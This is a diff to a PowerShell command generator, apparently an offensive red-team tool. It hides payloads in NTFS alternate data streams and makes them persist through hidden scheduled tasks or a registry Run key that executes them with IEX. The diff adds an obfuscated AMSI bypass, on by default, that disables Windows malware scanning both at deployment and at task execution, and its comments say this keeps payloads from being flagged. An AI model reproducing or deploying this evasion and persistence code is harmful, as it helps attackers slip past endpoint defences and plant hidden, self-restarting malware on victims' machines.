@@ -42,6 +42,9 @@
 .PARAMETER ManifestDir
     Manifest directory on Linux (default: ./manifests)
 
+.PARAMETER NoAmsi
+    Opt out of AMSI bypass (bypass is ON by default)
+
 .EXAMPLE
     pwsh ADS-OneLiner.ps1 \
       -Payload "Write-Host 'Test'" \
@@ -50,7 +53,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.0.0 (Command Generator)
+    Version: 2.1.0 (Command Generator)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
@@ -87,7 +90,7 @@ param(
     [string]$OutputFile = "ads-payload.txt",
     [string]$ManifestDir = "./manifests",
 
-    # Opt out of Amsi bypass
+    # Opt out of AMSI bypass (bypass is ON by default)
     [switch]$NoAmsi
 )
 
@@ -156,6 +159,11 @@ Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray
 if ($InstanceCount -gt 1) {
     Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
 }
+if (-not $NoAmsi) {
+    Write-Host "    AMSI Bypass: Enabled (Layer A + Layer B)" -ForegroundColor Yellow
+} else {
+    Write-Host "    AMSI Bypass: Disabled (-NoAmsi)" -ForegroundColor DarkGray
+}
 
 # Build minimal Windows commands
 Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White
@@ -207,6 +215,22 @@ $minimalScript += @"
 `$_tn0='$($config.TaskName)'
 
 "@
+
+# ============================================================
+# LAYER A: AMSI BYPASS FOR DEPLOYMENT SCRIPT
+# ============================================================
+# This runs BEFORE $pl is assigned, so AMSI can't scan the payload
+# string and block the entire deployment. Without this, payloads
+# containing known-bad cmdlet names (Set-NetFirewallProfile, etc.)
+# trigger "This script contains malicious content" at paste time.
+# ============================================================
+if (-not $NoAmsi) {
+    $minimalScript += @"
+# Runtime evasion
+`$_ab={try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{}};.`$_ab
+
+"@
+}
 
 # Payload handling (computed ONCE, before any loop)
 if ($PayloadAtDeployment) {
@@ -336,6 +360,18 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
             # ============================================================
             # ENCRYPTED: JScript wrapper with inline decryption functions
             # ============================================================
+
+            # Build the AMSI bypass line for Layer B (JScript wrapper)
+            # This is SEPARATE from Layer A — it protects the scheduled task
+            # execution session where IEX $p runs with the decrypted payload.
+            $jsAmsiLine = ""
+            if (-not $NoAmsi) {
+                $jsAmsiLine = @"
+    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
+
+"@
+            }
+
             $block += @"
 `$adsPath=`$hp+':'+`$sn
 `$_jsBody=@'
@@ -356,8 +392,7 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
     "};" +
     "`$k=Get-HostKey;" +
     "`$e=Get-Content '__ADSPATH__' -Raw;" +
-    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
-    "`$p=Dec `$e `$k;" +
+$jsAmsiLine    "`$p=Dec `$e `$k;" +
     "IEX `$p" +
     "\"";
 shell.Run(cmd, 0, false);
@@ -379,13 +414,22 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
             # ============================================================
             # UNENCRYPTED: JScript wrapper, simple IEX
             # ============================================================
+
+            # Build AMSI bypass for unencrypted Layer B
+            $jsAmsiLineUnenc = ""
+            if (-not $NoAmsi) {
+                $jsAmsiLineUnenc = @"
+    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
+
+"@
+            }
+
             $block += @"
 `$adsPath=`$hp+':'+`$sn
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
-    "IEX(Get-Content '__ADSPATH__' -Raw)" +
+$jsAmsiLineUnenc    "IEX(Get-Content '__ADSPATH__' -Raw)" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
@@ -404,11 +448,18 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 "@
         }
     } elseif ($Persist -eq 'registry') {
-        # Registry persistence: unchanged (no window-flash issue here)
-        $block += @"
+        # Registry persistence
+        if (-not $NoAmsi) {
+            $block += @"
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};IEX(gc '`$hp``:`$sn' -Raw)`""
 
 "@
+        } else {
+            $block += @"
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""
+
+"@
+        }
     }
 
     return $block
@@ -514,6 +565,7 @@ if (-not $PayloadAtDeployment) {
         DeepPlacement     = $UseDeepPlacement.IsPresent
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
+        AmsiBypass        = (-not $NoAmsi)
         PayloadHash       = $payloadHash
         Operator          = $env:USER
         GeneratedOn       = hostname
@@ -546,6 +598,7 @@ CONFIGURATION:
   Deep Placement: $($UseDeepPlacement.IsPresent)
   Attach to Existing: $($AttachToExisting.IsPresent)
   Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
+  AMSI Bypass: $(-not $NoAmsi) (Layer A: deployment, Layer B: task execution)
   
 PAYLOAD SIZE:
   Readable: $($minimalScript.Length) characters
@@ -592,7 +645,7 @@ Remove-Item '$($config.HostPath)' -Force
 `$_jsDir = Split-Path '$($config.HostPath)' -Parent
 if (`$_jsDir) { Get-ChildItem -Path `$_jsDir -Filter "windiag_*.js" -EA 0 | Remove-Item -Force }
 
-╔═══════════════════════════════════════════════════════════╗
+╔═══════════════════════════════════════════════════════════╝
 "@
 
 $outputContent | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
@@ -606,6 +659,9 @@ Write-Host "✓ Minimal commands generated" -ForegroundColor Green
 Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
 if (-not $PayloadAtDeployment) {
     Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
+}
+if (-not $NoAmsi) {
+    Write-Host "✓ AMSI bypass: Layer A (deployment) + Layer B (task execution)" -ForegroundColor Green
 }
 Write-Host ""
 Write-Host "READY TO DEPLOY!" -ForegroundColor Magenta
